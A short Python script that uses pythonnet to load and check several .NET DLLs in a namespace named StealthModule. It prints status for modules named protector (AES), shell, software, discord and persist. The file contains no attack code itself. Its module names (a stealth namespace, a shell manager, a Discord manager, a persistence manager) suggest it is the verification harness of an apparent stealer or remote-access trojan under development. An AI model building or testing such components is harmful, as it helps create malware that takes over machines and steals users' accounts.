import clr
import os
import sys

# Add bin directory to path for DLL loading
dll_dir = r"c:\Users\zxc23\OneDrive\Desktop\final\bin"
sys.path.append(dll_dir)

print("--- Native Module Verification ---")

try:
    print("[*] Testing protector.dll...")
    clr.AddReference("protector")
    from StealthModule import Protector
    test_str = "Hello World"
    encrypted = Protector.DAes(test_str)
    print(f"    - AES Encrypted: {encrypted[:20]}...")
    
    print("[*] Testing shell.dll...")
    clr.AddReference("shell")
    from StealthModule import ShellManager
    print(f"    - Shell running: {ShellManager.IsRunning()}")
    
    print("[*] Testing software.dll...")
    clr.AddReference("software")
    from StealthModule import SoftwareManager
    print("    - SoftwareManager initialized.")

    print("[*] Testing discord.dll...")
    clr.AddReference("discord")
    from StealthModule import DiscordManager
    print("    - DiscordManager initialized.")

    print("[*] Testing persist.dll...")
    clr.AddReference("persist")
    from StealthModule import PersistManager
    print("    - PersistManager initialized.")

    print("\n✅ All tested modules loaded and initialized successfully!")
except Exception as e:
    print(f"\n❌ Verification FAILED: {e}")
